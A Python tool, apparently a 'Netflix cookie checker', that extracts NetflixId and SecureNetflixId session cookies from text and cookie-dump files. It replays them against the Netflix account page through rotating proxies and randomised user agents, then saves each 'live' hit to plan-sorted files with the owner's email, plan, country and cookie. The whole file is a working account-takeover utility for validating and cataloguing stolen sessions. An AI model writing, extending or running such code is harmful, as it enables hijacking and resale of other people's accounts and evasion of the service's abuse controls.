import re
import time
import random
import requests
import threading
import json
import os
from datetime import datetime, timezone
from html import unescape
from urllib.parse import unquote
from dataclasses import dataclass, field, asdict
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# ────────────────────────────────────────────────────────────────────────────
#  Data models & Extraction (from original)
# ────────────────────────────────────────────────────────────────────────────
_COUNTRY_NAMES = {
    "IN": "India", "US": "United States", "GB": "United Kingdom", "UK": "United Kingdom",
    "CA": "Canada", "AU": "Australia", "DE": "Germany", "FR": "France", "IT": "Italy",
    "ES": "Spain", "BR": "Brazil", "MX": "Mexico", "JP": "Japan", "KR": "South Korea",
    "CN": "China", "HK": "Hong Kong", "SG": "Singapore", "MY": "Malaysia",
    "ID": "Indonesia", "PH": "Philippines", "TH": "Thailand", "VN": "Vietnam",
    "PK": "Pakistan", "BD": "Bangladesh", "NP": "Nepal", "LK": "Sri Lanka",
    "AE": "United Arab Emirates", "SA": "Saudi Arabia", "QA": "Qatar", "KW": "Kuwait",
    "BH": "Bahrain", "OM": "Oman", "EG": "Egypt", "ZA": "South Africa",
    "NG": "Nigeria", "KE": "Kenya", "TR": "Turkey", "RU": "Russia", "UA": "Ukraine",
    "PL": "Poland", "NL": "Netherlands", "BE": "Belgium", "SE": "Sweden",
    "NO": "Norway", "DK": "Denmark", "FI": "Finland", "IE": "Ireland",
    "PT": "Portugal", "CH": "Switzerland", "AT": "Austria", "GR": "Greece",
    "CZ": "Czech Republic", "RO": "Romania", "HU": "Hungary", "AR": "Argentina",
    "CL": "Chile", "CO": "Colombia", "PE": "Peru", "VE": "Venezuela", "NZ": "New Zealand",
}

def _country_name(code: str) -> str:
    if not code or code == "-": return "-"
    return _COUNTRY_NAMES.get(code.upper(), code)

@dataclass
class NetflixPair:
    nid: str
    sid: Optional[str] = None
    nid_raw: str = ""
    sid_raw: Optional[str] = None
    source: str = ""
    nftoken: Optional[str] = None

    @property
    def combo_line(self) -> str:
        line = f"NetflixId={self.nid_raw or self.nid}"
        if self.sid_raw: line += f"; SecureNetflixId={self.sid_raw}"
        return line

@dataclass
class AccountInfo:
    display_name: str = "-"
    email: str = "-"
    country_code: str = "-"
    country: str = "-"
    plan: str = "-"
    plan_price: str = "-"
    profiles: list = field(default_factory=list)

    def plan_folder(self) -> str:
        if not self.plan or self.plan == "-": return "UNKNOWN"
        safe = re.sub(r'[\\/*?:"<>|]', "_", self.plan).strip().replace(" ", "_")
        return safe.upper() or "UNKNOWN"

    def profile_count(self) -> int: return len(self.profiles or [])

@dataclass
class CheckResult:
    status: str
    info: Optional[AccountInfo] = None
    error: str = ""

_LOOKBEHIND = r'(?<![A-Za-z])'
_ID_CHARS   = r'[A-Za-z0-9%._\-+/=]{20,}'
RE_NID = re.compile(rf'{_LOOKBEHIND}NetflixId["\']?\s*[:=]\s*["\']?({_ID_CHARS})', re.I)
RE_SID = re.compile(rf'{_LOOKBEHIND}SecureNetflixId["\']?\s*[:=]\s*["\']?({_ID_CHARS})', re.I)
RE_NETSCAPE = re.compile(
    r'^(?P<domain>\S+)\s+(?P<flag>TRUE|FALSE)\s+(?P<path>\S+)\s+'
    r'(?P<secure>TRUE|FALSE)\s+(?P<expiry>\d+)\s+(?P<name>\S+)\s+(?P<value>\S+)\s*$', re.MULTILINE,
)

def _dec(value: str) -> str:
    try: return unquote(value)
    except: return value

def extract_pairs(content: str, source: str = "") -> list[NetflixPair]:
    if not content: return []
    nids, sids = [], []
    for m in RE_NID.finditer(content): nids.append((m.start(), m.end(), m.group(1), _dec(m.group(1))))
    for m in RE_SID.finditer(content): sids.append((m.start(), m.end(), m.group(1), _dec(m.group(1))))
    for row in RE_NETSCAPE.finditer(content):
        if row.group("name").lower() == "netflixid": nids.append((row.start(), row.end(), row.group("value"), _dec(row.group("value"))))
        elif row.group("name").lower() == "securenetflixid": sids.append((row.start(), row.end(), row.group("value"), _dec(row.group("value"))))
    
    seen = set()
    pairs = []
    for n_start, n_end, n_raw, n_dec in nids:
        if n_dec in seen: continue
        seen.add(n_dec)
        best, best_dist = None, 10**9
        for s_start, s_end, s_raw, s_dec in sids:
            if s_dec == n_dec: continue
            d = min(abs(s_start - n_end), abs(n_start - s_end))
            if d < best_dist and d <= 800: best, best_dist = (s_raw, s_dec), d
        pairs.append(NetflixPair(nid=n_dec, sid=best[1] if best else None, nid_raw=n_raw, sid_raw=best[0] if best else None, source=source))
    return pairs

def load_file_pairs(path: Path) -> list[NetflixPair]:
    try: text = path.read_text("utf-8", errors="ignore")
    except: return []
    return extract_pairs(text, source=path.name)

# ────────────────────────────────────────────────────────────────────────────
#  HTTP & Parsing
# ────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]

class ProxyPool:
    def __init__(self):
        self._lock = threading.Lock()
        self._pool = []

    def load(self, path: Path) -> int:
        try: lines = path.read_text("utf-8", errors="ignore").splitlines()
        except: return 0
        with self._lock:
            self._pool = []
            for line in lines:
                s = line.strip()
                if not s: continue
                if not s.startswith(("http://", "https://", "socks")):
                    s = f"http://{s}" if "@" in s or len(s.split(":")) == 2 else f"http://{s}"
                self._pool.append({"url": s, "fails": 0, "cooldown": 0})
        return len(self._pool)

    def acquire(self):
        with self._lock:
            ready = [p for p in self._pool if time.time() >= p["cooldown"]]
            candidates = ready if ready else self._pool
            if not candidates: return None
            return random.choice(candidates)["url"]

    def report(self, url, ok):
        if not url: return
        with self._lock:
            for p in self._pool:
                if p["url"] == url:
                    if ok: p["fails"] = 0
                    else:
                        p["fails"] += 1
                        p["cooldown"] = time.time() + min(300, 5 * (2 ** (p["fails"] - 1)))
                    break

class SessionPool:
    def __init__(self): self._local = threading.local()
    def get(self):
        s = getattr(self._local, "session", None)
        if s is None:
            s = requests.Session()
            s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
            self._local.session = s
        return s

def parse_account(html: str) -> AccountInfo:
    info = AccountInfo()
    m = re.search(r'"currentPlan":\{"fieldType":"Group".*?"localizedPlanName":\{"fieldType":"String","value":"(.*?)"\}', html)
    if m: info.plan = m.group(1)
    
    m = re.search(r'"emailAddress"\s*:\s*"((?:[^"\\]|\\.)*)"', html)
    if m: info.email = unescape(m.group(1))
    
    m = re.search(r'"countryCode"\s*:\s*"([A-Z]{2})"', html)
    if m:
        info.country_code = m.group(1)
        info.country = _country_name(m.group(1))
    return info

def check_one(pair: NetflixPair, sessions: SessionPool, proxies: Optional[ProxyPool], timeout: int, retries: int) -> CheckResult:
    cookies = {"NetflixId": pair.nid}
    if pair.sid: cookies["SecureNetflixId"] = pair.sid
    attempt = 0
    while attempt <= retries:
        attempt += 1
        proxy_url = proxies.acquire() if proxies else None
        proxy_map = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        try:
            r = sessions.get().get("https://www.netflix.com/account", cookies=cookies, proxies=proxy_map, timeout=timeout, allow_redirects=False)
        except:
            if proxies: proxies.report(proxy_url, ok=False)
            continue
            
        if proxies: proxies.report(proxy_url, ok=(r.status_code == 200))
        if r.status_code in (301, 302): return CheckResult(status="DEAD")
        if r.status_code != 200: continue
        
        info = parse_account(unescape(r.text))
        return CheckResult(status="LIVE", info=info)
    return CheckResult(status="DEAD")

# ────────────────────────────────────────────────────────────────────────────
#  Web Engine
# ────────────────────────────────────────────────────────────────────────────
class WebEngine:
    def __init__(self, pairs, output_root, threads, timeout, retries, proxy_pool, progress_queue):
        self.pairs = pairs
        self.output_root = Path(output_root)
        self.threads = threads
        self.timeout = timeout
        self.retries = retries
        self.proxies = proxy_pool
        self.sessions = SessionPool()
        self.q = progress_queue
        
        (self.output_root / "HITS").mkdir(parents=True, exist_ok=True)
        (self.output_root / "DEAD").mkdir(parents=True, exist_ok=True)
        
        self.total = len(pairs)
        self.done = self.hits = self.dead = self.errors = 0
        self._lock = threading.Lock()

    def run(self):
        self.q.put({"type": "log", "msg": f"Engine start — {self.total} pairs, {self.threads} threads", "tag": "info"})
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self._task, p): p for p in self.pairs}
            for fut in as_completed(futures):
                try: fut.result()
                except Exception as e: self.q.put({"type": "log", "msg": f"Thread error: {e}", "tag": "warn"})
        self.q.put({"type": "done"})
        self.q.put(None)

    def _task(self, pair):
        result = check_one(pair, self.sessions, self.proxies, self.timeout, self.retries)
        with self._lock:
            self.done += 1
            if result.status == "LIVE":
                self.hits += 1
                self._save_hit(pair, result)
                info = result.info
                self.q.put({"type": "hit", "email": info.email, "plan": info.plan, "country": info.country})
            else:
                self.dead += 1
                self._save_dead(pair, result)
                self.q.put({"type": "dead", "msg": "Dead cookie"})
                
            self.q.put({"type": "stats", "done": self.done, "total": self.total, "hits": self.hits, "dead": self.dead})

    def _save_hit(self, pair, result):
        info = result.info
        folder = self.output_root / "HITS" / info.plan_folder()
        folder.mkdir(exist_ok=True)
        file = folder / f"{info.plan_folder()}.txt"
        line = f"Email: {info.email} | Plan: {info.plan} | Country: {info.country} | Cookie: {pair.combo_line}\n"
        with open(file, "a", encoding="utf-8") as f: f.write(line)

    def _save_dead(self, pair, result):
        file = self.output_root / "DEAD" / "dead.txt"
        with open(file, "a", encoding="utf-8") as f: f.write(f"{pair.combo_line}\n")
